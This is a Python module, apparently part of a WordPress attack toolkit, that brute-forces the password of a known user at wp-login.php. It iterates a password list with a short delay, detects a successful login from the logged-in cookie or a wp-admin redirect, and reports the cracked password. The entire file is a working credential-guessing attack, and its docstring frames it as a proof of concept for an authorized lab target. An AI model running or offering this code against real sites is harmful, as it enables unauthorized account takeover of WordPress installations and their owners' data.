"""Credential brute-force against wp-login.php for a known username.

Deliberately small and slow (short list + delay) — this is a proof-of-concept
for an authorized, intentionally-vulnerable target, not a cracking tool.
"""
from __future__ import annotations

import time

from requests import RequestException

from .enumerators import wp_login
from .http_client import HttpClient


def _login_succeeded(resp) -> bool:
    # On success WordPress 302-redirects into wp-admin and sets a logged-in cookie.
    if any(c.name.startswith("wordpress_logged_in") for c in resp.cookies):
        return True
    if resp.status_code in (301, 302, 307, 308):
        loc = resp.headers.get("Location", "")
        return "wp-admin" in loc and "wp-login" not in loc
    return False


def load_passwords(path: str) -> list[str]:
    with open(path, encoding="utf-8") as fh:
        return [ln.strip() for ln in fh if ln.strip() and not ln.startswith("#")]


def bruteforce_login(
    client: HttpClient,
    target: str,
    username: str,
    passwords: list[str],
    delay: float = 0.3,
) -> dict:
    """Try each password for `username`. Stops on first success."""
    attempts = 0
    for pw in passwords:
        attempts += 1
        try:
            resp = wp_login(client, target, username, pw)
        except RequestException as exc:
            return {"success": False, "password": None, "attempts": attempts,
                    "evidence": f"request failed after {attempts} attempt(s): {exc}"}
        if _login_succeeded(resp):
            return {"success": True, "password": pw, "attempts": attempts,
                    "evidence": f"wp-login.php accepted '{username}' on attempt {attempts}"}
        time.sleep(delay)
    return {"success": False, "password": None, "attempts": attempts,
            "evidence": f"no password in the list worked ({attempts} tried)"}
